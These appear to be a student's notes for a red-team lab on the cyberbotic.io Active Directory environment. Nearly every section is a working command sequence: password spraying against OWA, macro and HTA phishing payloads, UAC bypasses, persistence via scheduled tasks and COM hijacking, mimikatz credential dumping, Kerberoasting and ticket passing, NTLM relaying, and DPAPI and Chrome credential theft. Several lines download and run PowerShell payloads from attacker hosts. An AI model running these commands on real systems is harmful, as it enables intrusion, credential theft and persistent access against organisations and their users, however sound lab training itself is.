
# DNS records
```
dig cyberbotic.io+ short
```

```
whois 104.21.90.222
```

Spoofcheck is a Python tool that
can verify the email security of a given domain.
```
./spoofcheck.py cyberbotic.io
```
# Password spray
Password spraying is an effective technique for discovering weak passwords that users are
notorious for using. Patterns such as MonthYear (August2019), SeasonYear (Summer2019)
and DayDate (Tuesday6) are very common.

Two excellent tools for password spraying against Office 365 and Exchange
are MailSniper and SprayingToolkit. On the attacker-windows VM, open PowerShell and
import MailSniper.ps1.

In powershell:
```
ipmo C:\Tools\MailSniper\MailSniper.ps1
```

Enumerate the NetBIOS name of the target domain with Invoke-DomainHarvestOWA:
```
Invoke-DomainHarvestOWA -ExchHostname 10.10.15.100
```

Find names from https://cyberbotic.io website and put them in names.txt.

Use namemash.py to create permutations of usernames:
```
./namemash.py names.txt >> possible-usernames.txt
```

Then with Invoke-UsernameHarvestOWA check if usernames are valid:
```
Invoke-UsernameHarvestOWA -ExchHostname 10.10.15.100 -Domain CYBER -UserList .\possible-usernames.txt -OutFile valid.txt
Invoke-UsernameHarvestOWA -ExchHostname 10.10.15.100 -Domain DEV -UserList .\possible-usernames.txt -OutFile valid.txt
```

Spray passwords:
```
Invoke-PasswordSprayOWA -ExchHostname 10.10.15.100 -UserList .\valid.txt -Password Summer2021
```

Download global address list:
```
Get-GlobalAddressList -ExchHostname 10.10.15.100 -UserName CYBER\iyates -Password Summer2021 -OutFile gal.txt
```
# Phishing
Login to OWA, https://10.10.15.100.

Create HTA:
```
<html>
    <head>
        <title>Hello World/title>
    </head>
    <body>
	    <h2>Hello World</h2>
        <p>This is an HTA...</p>
    </body>
	<script language="VBScript">
		Function Pwn()
			Set shell = CreateObject("wscript.Shell")
			If shell.ExpandEnvironmentStrings("%PROCESSOS_ARCHITECHTURE%") = "AMD64" Then
				shell.run "calc"
			Else
				shell.run "calc"
			End If
		End Function
	Pwn
	</script>
</html>
```

Replace calc with beacon payload (scripted web delivery).
```
shell.run "powershell.exe -nop -w hidden -c "...""
```

Create VBA for macros (in word, view -> macros -> create, select Document 1, then create):
```
Sub AutoOpen()

	Dim Shell As Object
	Set Shell = CreateObject("wscript.shell")
	Shell.Run "calc"

End Sub
```

Alternative with WMI Win32_Process:
```
Sub AutoOpen()

	Dim proc As Object
	Set proc = GetObject("winmgmts\\.\root\cimv2:Win32:Process")
	proc.Create "powershell"

End Sub
```

Replace calc with beacon payload (scripted web delivery).
```
shell.run "powershell.exe -nop -w hidden -c "...""
```

Save word file as .docm or .doc.
## Remote template injection
```
remoteinjector.py -w http://nickelviper.com/template.dot /mnt/c/Payloads/document.docx
```
## HTML smuggling
```
<html>
    <head>
        <title>HTML Smuggling</title>
    </head>
    <body>
        <p>This is all the user will see...</p>

        <script>
        function convertFromBase64(base64) {
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            var bytes = new Uint8Array( len );
            for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
            return bytes.buffer;
        }

        var file ='VGhpcyBpcyBhIHNtdWdnbGVkIGZpbGU=';
        var data = convertFromBase64(file);
        var blob = new Blob([data], {type: 'octet/stream'});
        var fileName = 'test.txt';

        if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
        else {
            var a = document.createElement('a');
            document.body.appendChild(a);
            a.style = 'display: none';
            var url = window.URL.createObjectURL(blob);
            a.href = url;
            a.download = fileName;
            a.click();
            window.URL.revokeObjectURL(url);
        }
        </script>
    </body>
</html>
```
# Seatbelt
Build and use seatbelt to recon.

In beacon:
```
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe -group=system
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe -group=user
```

## UAC bypass
```
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe uac
```

Look for priv esc checks and if UAC can be bypassed:
```
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Debug\SharpUp.exe
```

```
elevate uac-token-duplication tcp-4444-local
```

Or:
```
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring("http://10.10.5.120/b"))"
connect localhost 4444
```

Not all UAC bypasses are equal, use seatbelt to list tokens:
```
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe TokenPrivileges
```

Token duplication will give lower privileges, so you have to elevate further:
```
elevate svc-exe tcp-4444-local
```
# Misc enum
In beacon:
```
screenshot
keylogger
```

```
jobs
jobkill <JID>
```
# Persistence
## Task scheduler
Creating payload in windows:
```
$str = 'IEX ((new-object net.webclient).downloadstring("http://10.10.5.120/a"))'
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
```

Creating payload in linux:
```
str='IEX ((new-object net.webclient).downloadstring("http://10.10.5.120/a"))'
echo -en $str | iconv -t UTF-16LE | base64 -w 0
```

In beacon:
```
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <output from above>" -n "Updater" -m add -o hourly
```

## Startup folder
In beacon:
```
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <output from above>" -f "UserEnvEsetup" -m add
```

## Registry autorun
In beacon:
```
cd C:\ProgramData
upload C:\Payloads\beacon-http.exe
mv beacon-http.exe updater.exe
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe -t reg -c "C:\ProgramData\updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add
```

## DCOM hijack
Look under HKEY_CLASSES_ROOT\CLSID and HKEY_CLASSES_ROOT\Interface for id:s that look like {...}.

In powershell, if its in HKLM but not in HKCU then we can hijack it:
```
Get-Item -Path "HKLM:\Software\Classes\CLSID\{...}\..."
Get-Item -Path "HKCU:\Software\Classes\CLSID\{...}\..."
```

Exploit:
```
New-Item -Path "HKCU:\Software\Classes\CLSID" -Name "{...}"
New-Item -Path "HKCU:\Software\Classes\CLSID\{...}" -Name "..." -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{...}\..." -Name "ThreadingModel" -Value Both
```

Generate payload in cobalt strike (windows executable (s), select windows dll).

```
cd C:\
upload C:\Payloads\beacon.dll
```

Find compatible tasks with powershell:
```
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
	if ($Task.Actions.ClassId -ne $null)
	{
		if ($Task.Triggers.Enabled -eq $true)
		{
			if ($Task.Principal.GroupId -eq "Users")
			{
				Write-Host "Task-Name: " $Task.TaskName
				Write-Host "Task-Path: " $Task.TaskPath
				Write-Host "CLSID: " $Task.Actions.ClassId
				Write-Host
			}
		}
	}
}
```

# Privilege escalation
## Windows services
```
sc query
Get-Service | fl
```
## Unquoted service paths
```
run wmic service get name, pathname
```

```
powershell Get-Acl -Path "C:\Program Files\Vuln Services" | fl
```

Exploit:
```
cd C:\Program Files\Vuln Services
ls
upload C:\Payloads\beacon-tcp-svc.exe
mv beacon-tcp-svc.exe Service.exe
```

```
run sc stop Vuln-Service-1
run sc start Vuln-Service-1
```

```
connect localhost 4444
```

## Weak service permissions
```
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Debug\SharpUp.exe
```

```
powershell-import C:\Tools\Get-ServiceAcl.ps1
powershell Get-ServiceAcl -Name Vuln-Service-2 | select -expandproperty Access
```

Exploit:
```
mkdir C:\Temp
cd C:\Temp
upload C:\Payloads\beacon-tcp-svc.exe
mv C:\Payloads\beacon-tcp-svc.exe fake-service.exe
run sc qc Vuln-Service-2
run sc config Vuln-Service-2 binPath= C:\Temp\fake-service.exe
run sc qc Vuln-Service-2
run sc query Vuln-Service-2
run sc stop Vuln-Service-2
run sc start Vuln-Service-2
connect localhost 4444
```

## Weak service binary permissions
```
powershell Get-Acl -Path "C:\Program Files\Vuln Services\Service 3.exe" | fl
```

```
download Service 3.exe
upload C:\Payloads\Service 3.exe
<error, file is used by another process>
```

Generate payload Service 3.exe in cobalt strike.

```
run qc stop Vuln-Service-3
upload C:\Payloads\Service 3.exe
run qc start Vuln-Service-3
connect localhost 4444
```

## Always install elevated
```
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Debug\SharpUp.exe
```

Look for AlwaysInstallElevated registry keys and HKLM: 1 and HKCU: 1

Create project in Visual Studio, search for installer, select Setup Wizard.

Set name and location to C:\Payloads, select place solution and project in same directory.

Choose files to add, click add and select generated payload from cobalt strike.

Right click project in Visual Studio, view -> custom actions
Right click install and select add custom action
Double click application folder, select beacon payload, click OK
Change Run64Bit to True in custom action properties

Build project

```
cd C:\Temp
upload C:\Payloads\BeaconInstaller\Debug\BeaconInstaller.msi
run msiexec /i BeaconInstaller /q /n
connect localhost 4444
```

# Domain recon
```
powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
```
## Get-Domain
You can use -Domain to specify the domain.
```
powershell Get-Domain
powershell Get-Domain -Domain cyberbotic.io
```
## Get-DomainController
Get domain controllers:
```
powershell Get-DomainController | select Forest, Name, OSVersion | fl
```
## Get-ForestDomain
You can use -Forest to specify the forest.
```
powershell Get-ForestDomain
powershell Get-ForestDomain -Forest cyberbotic.io
```
## Get-DomainPolicyData
Find policies such as password policy:
```
powershell Get-DomainPolicyData | select -ExpandProperty SystemAccess
```
## Get-DomainUser
All users:
```
powershell Get-DomainUser | fl
```

Specific user:
```
powershell Get-DomainUser -Identity nlamb | fl
```

Get domain user by property and user:
```
powershell Get-DomainUser -Identity nlamb -Properties DisplayName, MemberOf | fl
```

Get all domain users by property:
```
powershell Get-DomainUser -Properties DisplayName, MemberOf | fl
```
## Get-DomainComputer
All computers:
```
powershell Get-DomainComputer
```

Get domain computer by property:
```
powershell Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName
```
## Get-DomainOU
All OUs:
```
powershell Get-DomainOU
```

Get domain OU by property:
```
powershell Get-DomainOU -Properties Name | sort -Property Name
```
## Get-DomainGroup
All groups:
```
powershell Get-DomainGroup
```

Get domain groups by property:
```
powershell Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName
```
## Get-DomainGroupMember
Get members of a specific domain group:
```
powershell Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName
```
## Get-DomainGPO
Get all GPOs:
```
powershell Get-DomainGPO -Properties DisplayName | sort -Property DisplayName
```

Get all GPOs for a computer:
```
powershell Get-DomainGPO -ComputerIdentity wkstn-1 -Properties DisplayName | sort -Property DisplayName
```
## Get-DomainGPOLocalGroup
```
powershell Get-DomainGPOLocalGroup | select GPODisplayName, GroupName
```
## Get-DomainGPOUserLocalGroupMapping
Check if a specific domain user or group is a member of a specific local group:
```
powershell Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName
```
## Find-DomainUserLocation
Enumerate all machines and query the domain for users of a specified group. Finds the domain machines where those users are logged in:
```
powershell Find-DomainUserLocation | select UserName, SessionFromName
```
## Get-NetSession
CName is source IP.
```
powershell Get-NetSession -ComputerName dc-2 | select CName, UserName
```
## Get-DomainTrust
Get all domain trusts for the current domain:
```
powershell Get-DomainTrust
```

Get all domain trusts for the specific domain:
```
powershell Get-DomainTrust -Domain cyberbotic.io
```
## SharpView
You can use same commands in SharpView as for PowerView, its the .NET port of PowerView.
```
execute-assembly C:\Tools\SharpView\SharpView\bin\Debug\SharpView.exe Get-Domain
```
## ADSearch
Example, search for all groups ending with Admins: 
```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=group)(cn=*Admins))"
```
## BloodHound
Start neo4j:
```
cd C:\Tools\neo4j\bin
neo4j.bat console
```

Collect DcOnly and domain with SharpHound:
```
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound3.exe -c DcOnly -d cyberbotic.io
```

Collect all:
```
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound3.exe -c All
```

Then download BloodHound.zip and upload to BloodHound GUI.

### Cypher queries
Find all users with SPN set:
```
MATCH (u:User {hasspn:true}) RETURN u
```

Find all computers will AllowedToDelegate to other computers:
```
MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) RETURN p
```

Find shortest path from kerberoastable users (SPN set) to domain admin:
```
MATCH (u:User {hasspn:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p
```
# Lateral movement
We can use jump, remote-exec or even seatbelt.
```
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe powershell -computername=srv-1
```

Always test local admin access on target before moving:
```
ls \\srv-1\c$
```
## Powershell remoting
Check arch of target:
```
remote-exec winrm srv-1 (Get-WmiObject Win32_OperatingSystem).OSArchitecture
```

Then jump (returns high integrity beacon):
```
jump winrm64 srv-1 smb
```
## PsExec
PsExec uploads a service binary to the target and then create a windows service to start and execute the binary.

Performs process migration automatically.

Returns SYSTEM beacon:
```
jump psexec64 srv-1 smb
```
## WMI
Part of remote-exec and we have to first upload a payload:
```
cd \\srv-1\ADMIN$
upload C:\Payloads\beacon-smb.exe
remote-exec wmi srv-1 C:\Windows\beacon-smb.exe
```

Then link it:
```
link srv-1
```
## CoInitializeSecurity
If remote-exec does not work, and returns "CoInitializeSecurity already called", our WMI execution must come from a different process.

We can use spawn, spawnas or even execute-assembly with SharpWMI:
```
execute-assembly C:\Tools\SharpWMI\SharpWMI\bin\Debug\SharpWMI.exe action=exec computername=srv-2 command="C:\Windows\System32\calc.exe"
```
## DCOM
```
powershell-import C:\Tools\Invoke-DCOM.ps1
powershell Invoke-DCOM -ComputerName srv-1 -Method MMC20.Application -Command C:\Windows\beacon-smb.exe
```

Then link it:
```
link srv-1
```
# Credentials and impersonation
Check for currently logged in users:
```
net logons
```
## LogonPasswords
Dump plaintext passwords from memory.

Using mimikatz:
```
mimikatz sekurlsa::logonpasswords
```

Or short command:
```
logonpasswords
```

NTLM = RC4
eKeys = SHA256 or SHA128
## eKeys
Dump eKeys:
```
mimikatz sekurlsa::ekeys
```

Look for aes256_hmac or aes128_hmac.
## SAM
Dump SAM:
```
mimikatz lsadump::sam
```

Contains NTLM hashes of local accounts only.
## Domain cached credentials
Dump cache:
```
mimikats lsadump::cache
```

These credentials are rarely used but should be cracked offline.
## Make token
Impersonate a user:
```
make_token DEV\jking Purpl3Drag0n
```

Revert to self, dispose of token:
```
rev2self
```
## Process injection
List processes:
```
ps
```

Inject into process with PID 3320:
```
inject 3320 x64 tcp-4444-local
```
## Token impersonation
Impersonate access token from target process, requires local admin:
```
steal_token 3320
```
## SpawnAs
Spawn a new process using plaintext credentials, does not require local admin:
```
spawnas DEV\jking Purpl3Drag0n tcp-4444-local
```

Common mistake is to run the command where you dont have read access. Run it in C:\.
## Pass the hash
Authenticate to a windows service using NTLM hash of a user:
```
pth DEV\jking <NTLM>
```

To avoid \\.pipe\ indicator in pth, use mimikatz and specify process:
```
mimikatz sekurlsa::pth /user:jking /domain:dev.cyberbotic.io /ntlm:<NTLM>
```

If we dont add /run, cmd.exe is used. Use for example powershell:
```
mimikatz sekurlsa::pth /user:jking /domain:dev.cyberbotic.io /run:powershell -w hidden /ntlm:<NTLM>
```

Then steal the token from the spawned process:
```
steal_token <PID>
```
## Overpass the hash
Authenticate with kerberos instead of NTLM, 4 steps.
- Request a TGT for the user that you want to impersonate
- Create a sacrificial logon session
- Pass the TGT to that logon session
- Access the target resource

With NTLM:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:jking /domain:dev.cyberbotic.io /rc4:<NTLM> /nowrap
```

Or use eKeys:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:jking /domain:dev.cyberbotic.io /aes256:<eKeys> /nowrap /opsec
```

To verify:
```
run klist
```

Next step, create a sacrificial logon session:
```
make_token DEV\jking FakePass
```

Now klist should list 0 tokens.

Pass the TGT to that logon session, in powershell:
```
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("...ticket..."))
```

Or in bash:
```
echo -en "...ticket..." | base64 -d > jkingTGT.kirbi
```

Use the TGT:
```
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi
```

Now you can access the target resource.

If you are in an elevated context (SYSTEM), use rubeus:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:jking /domain:dev.cyberbotic.io /aes256:<eKeys> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
```

Then steal the token:
```
steal_token <PID>
```
## Extract kerberos tickets
List all kerberos tickets in all the logon sessions currently on the system, if elevated it shows all, else only in your logon session:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe triage
```

Extract kerberos tickets from memory:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe dump /service:krbtgt /luid:<LUID> /nowrap
```

Create sacrificial process, using **createnetonly**, note the **LUID** and **ProcessID**:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
```

Pass the TGT to the sacrificial logon session, using **ptt**:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe ptt /luid:<LUID> /ticket:<...base64-ticket...>
```

Steal the access token of that process:
```
steal_token <PID>
```

Now you can access the target resource.

# Password cracking
Basic hashcat cracking:
```
D:\Tools\hashcat-6.1.1\hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt D:\Tools\rockyou.txt
```
**-a 0** is wordlist mode
**-m 1000** is NTLM hash
**ntlm.txt** is the NTLM hash to crack
**rockyou.txt** is the wordlist

## Wordlist + rules
```
D:\Tools\hashcat-6.1.1\hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt D:\Tools\rockyou.txt -r rules/add-year.rule
```
-r rules/add-year.rule is our custom rule file

Add **$2$0$2$0** to the add-year.rule file. It will append 2020 to the words in rockyou.txt.
## Masks
```
D:\Tools\hashcat-6.1.1\hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d
```
**-a 3** is mask attack
**?u?l?l?l?l?l?l?l?d** is the mask

```
D:\Tools\hashcat-6.1.1\hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -l ?d?s ?u?l?l?l?l?l?l?l?l
```
**-l** is custom charset
**?u?l?l?l?l?l?l?l?l** is the mask where **-l** is the custom charset
## Mask length & mask files
D:\\Tools\\example.hcmask:
```
?d?s,?u?l?l?l?l?l
?d?s,?u?l?l?l?l?l?l
?d?s,?u?l?l?l?l?l?l?l
?d?s,?u?l?l?l?l?l?l?l?l
?d?s,?u?l?l?l?l?l?l?l?l?l
```

```
D:\Tools\hashcat-6.1.1\hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt D:\Tools\example.hcmask
```

D:\\Tools\\example2.hcmask:
```
ZeroPointSecurity?d
ZeroPointSecurity?d?d
ZeroPointSecurity?d?d?d
ZeroPointSecurity?d?d?d?d
```

```
D:\Tools\hashcat-6.1.1\hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt D:\Tools\example2.hcmask
```
## Combinator
D:\\Tools\\list1.txt:
```
purple
```

D:\\Tools\\list2.txt:
```
monkey
dishwasher
```

```
D:\Tools\hashcat-6.1.1\hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt D:\Tools\list1.txt D:\Tools\list2.txt -j $- -k $!
```

Will become purple-monkey!
## Hybrid
With wordlist and mask:
```
D:\Tools\hashcat-6.1.1\hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt D:\Tools\list1.txt ?d?d?d?d
```
**-a 6** is hybrid wordlist and mask mode
**?d?d?d?d** is the mask

With mask and wordlist:
```
D:\Tools\hashcat-6.1.1\hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d D:\Tools\list1.txt
```
**-a 7** is hybrid mask and wordlist mode
**?d?d?d?d** is the mask
## Kwprocessor
Generate keywalk passwords:
```
D:\Tools\kwprocessor\kw64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
# Session passing
Spawn payloads that can talk to other cobalt strike listeners, or listeners of other C2 frameworks.

Metasploit:
```
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set LHOST eth0
set LPORT 8080
exploit -j
```

Create listener, add -> foreign http. Name it metasploit.

Spawn it in beacon:
```
spawn metasploit
```

Check metasploit for a session.

Alternative is to use **shinject** in beacon to inject arbitrary shellcode in to specified process:
```
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=10.10.5.120 LPORT=8080 -f raw -o /tmp/msf.bin
```

```
execute C:\Windows\System32\notepad.exe
ps
shinject <PID> x64 C:\Payloads\msf.bin
```

Same can be done in reverse, generate beacon payload, windows executable (s), select raw as output, x64. Save to beacon.bin.

Metasploit, a session has to exist already:
```
use post/windows/manage/shellcode_inject
set SESSION 1
set SHELLCODE /tmp/beacon.bin
run
```
# Socks proxy
Start socks proxy:
```
socks 1080
```

Edit **/etc/proxychains.conf** to reflect.
```
#proxy_dns
remote_dns

socks5 127.0.0.1 1080
```

Use proxychains with a tool like nmap.
# Windows apps
Tunnel GUI apps with Proxifier.
1. Profile -> proxy servers -> add.
2. Profile -> proxification rules, add your app and target hosts

RSAT with clear text credentials:
```
runas /netonly /user:DEV\nlamb "C:\windows\system32\mmc.exe C:\windows\system32\dsa.msc"
```

RSAT with NTLM:
```
mimikatz
privilege::debug
sekurlsa::pth /user:nlamb /domain:dev.cyberbotic.io /ntlm:<NTLM> /run:"C:\windows\system32\mmc.exe C:\windows\system32\dsa.msc"
```

Remember to add entry to hosts file (C:\\windows\\system32\\drivers\\etc\\hosts).

# Browsers
Use FoxyProxy in firefox.
# Metasploit
```
setg Proxies socks4:10.10.5.120:1080
```
# Reverse port forward
## In powershell
```
$endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Any, 4444)
$listener = New-Object System.Net.Sockets.TcpListener $endpoint
$listener.Start()
Write-Host "Listening on port 4444"
while ($true)
{
	$client = $listener.AcceptTcpClient()
	Write-Host "A client has connected"
	$client.Close()
}
```

```
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.14.55 connectport=4444 protocol=tcp
```

```
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## In beacon
Bind port 8080 on foothold machine and redirect to 10.10.5.120 port 80:
```
rportfwd 8080 10.10.5.120 80
```

```
rportfwd stop 8080
```

Forward to local machine:
```
rportfwd_local 8080 127.0.0.1 8080
```
# NTLM relaying
```
powershell New-NetFirewallRule -DisplayName "8445-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8445

powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
```

```
cd C:\Windows\System32\Drivers
upload C:\Tools\PortBender\WinDivert64.sys
```

Load **PortBender.cna** from **C:\\Tools\\PortBender** to cobalt strike.

Requires local admin to execute.

Redirect traffic from port **445** to **8445**:
```
PortBender redirect 445 8445
```

Relay traffic from port **8445** to port **445** to team server:
```
rportfwd 8445 127.0.0.1 445
```

Relay traffic from port **8080** to port **80** to team server:
```
rportfwd 8080 127.0.0.1 80
```

We need socks proxy for **ntlmrelayx** responses:
```
socks 1080
```

Now we can use **proxychains** and **ntlmrelayx**:
```
proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://10.10.17.68 -smb2support --no-http-server --no-wcf-server
```

Use NTLM for administrator from above dump:
```
pth .\Administrator <NTLM>
```

Alternatively run powershell command:
```
proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://10.10.17.68 -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -c "iex (new-object net.webclient).downloadstring(\"http://10.10.17.231:8080/b\")"'
```

Forcing NTLM authentication with images in emails:
```
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

NTLM authentication with shortcuts:
```
$wsh = new-object -ComObject wscript.shell
$shortcut = $wsh.CreateShortcut("\\dc-2\software\test.lnk")
$shortcut.IconLocation = "\\10.10.17.231\test.ico"
$shortcut.Save()
```
Where software is a share.

Now view the share to trigger the shortcut.

Remote Authentication Triggers execute-assembly:
```
C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe [target] [beacon] execute-assembly

C:\Tools\SharpSystemTriggers\SharpEfsTrigger\bin\Release\SharpEfsTrigger.exe [target] [beacon]
```
# DPAPI
## Credential manager
Credential manager blobs are stored in users AppData directory:
```
ls C:\Users\bfarmer\AppData\Local\Microsoft\Credentials
```

List creds with native **vaultcmd** in windows:
```
run vaultcmd /list
run vaultcmd /listcreds:"Windows Credentials" /all
run vaultcmd /listcreds:"Web Credentials" /all
```

Or with mimikatz:
```
mimikatz vault::list
```

To decrypt the credential, we first need to find the master encryption key:
```
mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\<...cred...>
```

Look for **pbData** and **guidMasterKey**.

The master key is located under the users **AppData\\Roaming\\Microsoft\\Protect\\SID** directory.
```
ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\<SID>
```
There should be a file that matches the **guidMasterKey**.

Use mimikatz with the master key:
```
mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\<SID>\<guidMasterKey> /rpc
```

Use mimikatz with the **key** from the output above to decrypt the credential:
```
mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\<...cred...> /masterkey:<key>
```

Or with Seatbelt:
```
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault execute-assembly

C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsCredentialFiles
```
## Google chrome
Chrome stores DPAPI credentials in a local SQLite database in the users AppData directory:
```
ls C:\Users\bfarmer\AppData\Local\Google\Chrome\User Data\Default
```

Look for **Login Data** directory and it should not be empty.

Decrypt with **SharpChromium**:
```
execute-assembly C:\Tools\SharpChromium\bin\Debug\SharpChromium.exe logins
```
# Kerberos
## Kerberoasting
Roast every account in the domain that has SPN set:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe kerberoast /simple /nowrap
```

Bad OPSEC but we can search for all users with SPN not blank instead:
```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(sAMAccountType=805306368)(servicePrincipalName=*))"
```

With BloodHound:
```
MATCH (u:User {hasspn:true}) RETURN u
```

Paths to computers from kerberoastable accounts:
```
MATCH (u:User {hasspn:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p
```

Kerberoast specific account with rubeus:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bind\Debug\Rubeus.exe kerberoast /user:svc_mssql /nowrap
```

Crack with john with **--format=krb5tgs --wordlist=rockyou.txt svc_mssql**

Crack with hashcat with **-a 0 -m 13100 svc_mssql rockyou.txt**
## AS-REP roasting
User that dont have kerberos pre-authentication enabled can be AS-REP roasted. Requesting a AS-REP for that user and crack it offline.

```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(sAMAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
```

In BloodHound:
```
MATCH (u:User {dontreqpreauth:true}) RETURN u
```

```
execute-assembly C:\Tools\Rubeus\Rubeus\bind\Debug\Rubeus.exe asreproast /user:svc_oracle /nowrap
```

Crack with john with **--format=krb5asrep --wordlist=rockyou.txt svc_mssql**

Crack with hashcat with **-a 0 -m 18200 svc_mssql rockyou.txt**
## Unconstrained delegation
Delegation allows a user or service to act on behalf of another user to another service. If we compromise a machine with unconstrained delegation, we can extract any TGTs from its memory and use it to impersonate the user against other services in the domain.

```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
```

In BloodHound:
```
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
```

Domain controllers always have unconstrained delegation configured by default, ignore them.

Monitor with rubeus for TGTs on the server and extract them, requires local admin:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bind\Debug\Rubeus.exe monitor /targetuser:nlamb /interval:10 /nowrap
```

If nlamb accesses the server, monitor will extract the TGT.

Stop monitor with **jobs** and **jobkill** in beacon.

Take the base64 encoded ticket from monitor and decode it to a **.kirbi** file, create sacrificial logon process and pass TGT into it:
```
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\nlamb.kirbi", [System.Convert]::FromBase64String("...ticket..."))
```
```
make_token DEV\nlamb FakePass
kerberos_ticket_use C:\Users\Administrator\Desktop\nlamb.kirbi
```
## The printer bug
On SRV-1:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bind\Debug\Rubeus.exe monitor /targetuser:DC-2$ /interval:10 /nowrap
```

On WKSTN-1:
```
execute-assembly C:\Tools\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe dc-2 srv-1
```
Where dc-2 is the target server and srv-1 is the capture server.

```
